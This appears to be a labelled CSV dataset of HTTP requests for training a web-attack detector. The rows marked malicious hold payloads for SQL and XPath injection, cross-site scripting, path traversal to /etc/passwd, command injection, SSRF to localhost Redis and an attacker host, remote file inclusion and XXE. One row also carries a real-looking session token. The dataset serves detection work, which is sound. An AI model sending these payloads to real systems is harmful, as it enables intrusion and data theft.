method,path,query,headers,body,ua,label
GET,/,?data=UtQfNzYJeTHLdiDWOS781H2n2TNXjps1nsD1lyN6rZxHwDhmBNTgd6VTKJJx3zyASWtkQ819xEIutsTE832%2FTerd6EmxXsCdHIunLphLMbCNlXZ1L9mkyyW0MGK3D%2FR4pzeOZRGNnoi5BE1l6BByXDRcBZeYeZGSdj6oIpP4zvW40WK8SJjCK1Wg%2FD2d4LBV3TtTxukLWRhRVfanObnCR%2BsViZTVlz2QXA4ZqcOpdnXMT8TKJf%2BFVmwiPzZ6ZO9bQe9MIcRjNoPGuT%2BXUgMOLarMktlzR%2BPjQHaOsDYUmju1lMM11SaQ2tyUbhcEXwtkkmWEQ%2Bqp2XrBmzCwO1qrVvkk5I9DbIg%2BDa2LaYXe9iCBeyYxz5czZ6X5DwqOCfhPxsrqSG1sTh0uW928oRKE7jQIgXp7sBUVTVJCrs7H8lMu2CA253Cr8zuLrqVb%2BjnIgPUNCYqGRhW%2FN2fc8vFlL57OzivIAfIiiCycEoj2atTCRzkRZSMCR5hJbOXMQndXqnb5IZtsF6KOFBkM7bsUUMKzpFe8DExOiKFmYk1ApKE6Cx0r0%2B1aYt%2FzW%2B97WFVDjjq9Df85gUrIisKbOf4YvXiwweUjp7OEKdChRDwbjY3O3VKx%2FygB6K4gZIsne%2Bn9P0WYnXaAuezBIAKDHtxTSUiHmRLbfKnrUZDHEhRXi3FdEG%2B2o8jOmALC2TfZ6X8%2FRSfDPMaZMHmRwKeGlRidj3quDv01rP%2FsBeo1cjZ40liW8HiUv0c%2Bh8XyKcU2ziY5rLPG2is3dZjogP3DU9wdOFV7mFkmhIWuROMrJ7T%2B3e0mTelfXjkxmT%2FBV1nmNC7K0d7ETuSfHk209CqkYmAOGe%2BGLM7Wa5Niua5DhzSCl9w40PmDN3IHofqY6D9R2MznrA3eAiMSFbJ5fxg7E8TRUeCVZXylOu8bCuOeclGZKaPiD9RqKGjuz43d%2B6SvRARVBxXXUun9GwiKoJrGvBh7FFXkHMD%2Btys8lyxou70Q%2BY5armdlIDEeLe44Aw0T5nA%2BN7c6vdfSOAZ5UQvsHNpyPw4VOZ3VRupUX%2F6QsNiMNwCGQzkVJUqzPGgdqsmVAt%2FggWTw%2FPyqb%2BvfFkEFoZHUx9K%2FXsWgfrqIUw4tk00fxg10TcS3EfQvpkBBMkxVD9RNVGfdl02sz8aiM91i75mWuA%3D%3D&lang=vi&b=908401&sdkVersion=1.5.49&rawData=,,,,0
GET,/assets/select-button-4O31eajp.woff2,,,HTTP/1.1,,0
GET,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,,,1
GET,/,url=http://malicious.com,,,,1
GET,/media/type-cat-nQMR7Xtm.svg,,,HTTP/1.1,,0
POST,/,,,"{""alg"":""none""}",,1
GET,/assets/select-handler-wOpFhbVe.js,,,HTTP/1.1,,0
GET,/assets/widget-eval-N7QOGma0.jpg,,,HTTP/1.1,,0
GET,/,onerror=alert(1),,,,1
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/assets/zone-where-QloWhAFA.svg,,,HTTP/1.1,,0
GET,"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/static/js/handler-drop-MOt771rQ.woff2,,,HTTP/1.1,,0
GET,/static/js/row-onerror-lhUzGGNU.js,,,HTTP/1.1,,0
GET,"alert.call(%20, ""XSS"");",,,,,1
GET,/media/where-clause-iaYRkR7n.jpg,,,HTTP/1.1,,0
GET,"<!--#exec cmd=""ls"" -->",,,,,1
GET,/build/date-select-gprJAKy5.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/eval-clause-rLXnu7pB.svg,,,HTTP/1.1,,0
GET,%253cscript%253ealert(1)%253c/script%253e,,,,,1
GET,/static/js/eval.min.css,,,HTTP/1.1,,0
GET,/,/inskyXss?db=monasca&q=SELECT%20mean(%22value%22)%20FROM%20%22mem.used_perc%22%20WHERE%20%22resource_id%22%20%3D~%20%2F%5Ebfb959fd-8128-4a68-98c7-d062ebd2dc4b%2F%20AND%20time%20%3E%3D%20now()%20-%206h%20and%20time%20%3C%3D%20now()%20GROUP%20BY%20time(1m)%2C%20resource_id&epoch=ms,,,,1
GET,/assets/eval.min.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/update.jpg,,,HTTP/1.1,,0
GET,/static/js/whoami.css,,,HTTP/1.1,,0
GET,/,?f24f266870=%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x,,,,1
GET,/,"<iframe/onload='this[""src""]=""jav""+""as&Tab;cr""+""ipt:al""+""er""+""t()""';>",,,,1
GET,/,,,,,0
GET,%0als,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,gopher://localhost:6379/_SET%20foo%20bar,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/build/drop-zone-dSUBwo3i.png,,,HTTP/1.1,,0
GET,/build/menu-insert-0JPpUduA.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/assets/cat.min.js,,,HTTP/1.1,,0
GET,/static/js/update-zone-udeC2hiE.css,,,HTTP/1.1,,0
GET,/build/alert.woff2,,,HTTP/1.1,,0
GET,/media/from-handler-YAMraNmj.svg,,,HTTP/1.1,,0
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,,,1
GET,/media/alert-function-9E9ItXy2.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/function-select-njaaCcU5.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,|| ls -la,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/id,token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIzNTEwMzcsImlhdCI6MTc3MjA5MTgzNywidXNlciI6eyJzZXNzaW9uX2lkIjoiMDE5Yzk4ZTctOGFjMi03Mjc0LWFkM2EtMmRiNzFhZTYzZThlIiwic291cmNlIjoiQk8iLCJzdGFmZl9jb2RlIjoibGluaGxoMiIsInVzZXJfZW1haWwiOiJsaW5obGgyQHZucGF5LnZuIiwidXNlcl9mdWxsX25hbWUiOiJMaW5oIEzDqiBIw,,,,0
GET,../../../../etc/passwd,,,,,1
GET,' or string-length(name(.)) > 0 or '1'='1,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/function-union-aDpT6431.svg,,,HTTP/1.1,,0
GET,/static/js/image-select-bvDN9RHo.svg,,,HTTP/1.1,,0
GET,/build/insert.min.js,,,HTTP/1.1,,0
GET,/static/css/script.js,,,HTTP/1.1,,0
GET,/media/widget-script-ZJWlrUOM.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/media/cat.svg,,,HTTP/1.1,,0
GET,/assets/where.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/css/whoami-tag-skYChuk3.woff2,,,HTTP/1.1,,0
GET,/static/css/from-image-WjawaGQL.svg,,,HTTP/1.1,,0
GET,"<video><source onerror=""alert(1)"">",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,select from,,,,,1
GET,/assets/update.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/cat.min.js,,,HTTP/1.1,,0
GET,/static/js/type-from-CQ4kxQ04.png,,,HTTP/1.1,,0
GET,"<video><source onerror=""alert(1)"">",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/media/delete.min.css,,,HTTP/1.1,,0
GET,/assets/where-dialog-DDfCdpod.css,,,HTTP/1.1,,0
GET,/build/alert.woff2,,,HTTP/1.1,,0
GET,cmd=127.0.0.1 && ls /etc,,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/assets/drop-menu-lDAprp74.js,,,HTTP/1.1,,0
GET,cmd=127.0.0.1 && ls /etc,,,,,1
GET,/static/css/insert.css,,,HTTP/1.1,,0
GET,id=1' OR '1'='1,,,,,1
GET,/media/delete.svg,,,HTTP/1.1,,0
GET,"alert.call(%20, ""XSS"");",,,,,1
GET,/media/eval-clause-d1oQ3NG5.svg,,,HTTP/1.1,,0
GET,/static/css/drop-widget-sENWBbd0.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/row-from-y4UZnCQd.woff2,,,HTTP/1.1,,0
GET,/static/css/button-script-JHkzqXy2.js,,,HTTP/1.1,,0
GET,/build/cat.jpg,,,HTTP/1.1,,0
GET,<body onload=alert('test1')>,,,,,1
GET,/build/where.jpg,,,HTTP/1.1,,0
GET,/,?a62587115d=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,,,,1
GET,/static/css/drop-row-FPvGCOs7.png,,,HTTP/1.1,,0
GET,"<video src=x onerror=""prompt(xss"">",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,http://attacker.com/shell.txt,,,,,1
GET,/media/select-clause-Bca2gOxB.woff2,,,HTTP/1.1,,0
GET,/media/update.js,,,HTTP/1.1,,0
GET,/assets/where.woff2,,,HTTP/1.1,,0
GET,"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><xs:schema xm lns:xs=""http://www.w3.org/2001/XMLSchema""><xs:include namespace=""htt p://xxe-xsinclude-namespace.yourdomain[.]com/""/></xs:schema>",,,,,1
GET,/build/date-cat-vIBF7grh.woff2,,,HTTP/1.1,,0
GET,/,&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;,,,,1
GET,"prompt.call(null,1)",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/static/css/cat-button-1WoIsfsg.css,,,HTTP/1.1,,0
GET,php://input,,,,,1
GET,/media/union.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/update-icon-xumpyvGO.css,,,HTTP/1.1,,0
GET,/build/handler-cat-Cea1oQho.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,/static/js/update-row-ydCnM18V.jpg,,,HTTP/1.1,,0
GET,/build/menu-onerror-uvSt8EM5.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/static/css/insert.min.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/tag-onerror-oAAUWXPG.woff2,,,HTTP/1.1,,0
GET,/,ax--exec=`id`--remote=origin,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/drop.css,,,HTTP/1.1,,0
GET,/assets/insert-widget-8XWC1CFs.png,,,HTTP/1.1,,0
GET,/media/whoami.css,,,HTTP/1.1,,0
GET,/media/date-alert-t7tbNZqK.jpg,,,HTTP/1.1,,0
GET,/assets/delete.min.css,,,HTTP/1.1,,0
GET,/assets/where-row-okcFSnNr.css,,,HTTP/1.1,,0
GET,/static/js/select-form-8QCv41on.svg,,,HTTP/1.1,,0
GET,' or '1'='1,,,,,1
GET,/build/union.jpg,,,HTTP/1.1,,0
GET,/assets/cat.svg,,,HTTP/1.1,,0
GET,' or string-length(name(.)) > 0 or '1'='1,,,,,1
